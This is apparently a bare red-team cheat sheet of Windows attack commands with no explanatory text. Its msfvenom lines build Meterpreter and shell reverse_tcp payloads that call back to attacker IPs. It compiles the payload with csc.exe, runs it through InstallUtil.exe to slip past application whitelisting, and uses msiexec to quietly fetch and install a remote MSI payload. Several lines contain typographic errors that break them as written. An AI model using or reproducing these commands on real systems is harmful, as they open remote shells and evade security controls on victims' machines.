
```
msfvenom -a x86_64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f csharp
msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f csharp > shellcode.txt

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /reference:System.IO.Compression.dll /target:library /out:test.exe /platform:x64 /unsafe C:\Users\Commando\Desktop\MSF_Payload.cs
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\John\Desktop\Micropoor.exe

```
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.174.134 LPORT=4444 - f msi > qing.txt
C:\Windows\System32\msiexec.exe /q /i http://192.168.174.134 /qing.txt
```
